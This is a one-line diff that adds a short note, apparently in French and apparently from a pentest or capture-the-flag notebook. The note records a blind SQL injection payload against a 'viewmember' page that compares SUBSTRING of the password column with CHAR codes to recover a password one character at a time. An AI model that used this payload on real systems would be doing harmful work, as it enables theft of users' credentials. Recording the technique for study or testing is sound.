@@ -1,0 +1,1 @@
+sqli sur viewmember: id=1 AND SUBSTRING(password,1,x)=CHAR(codes ascii)
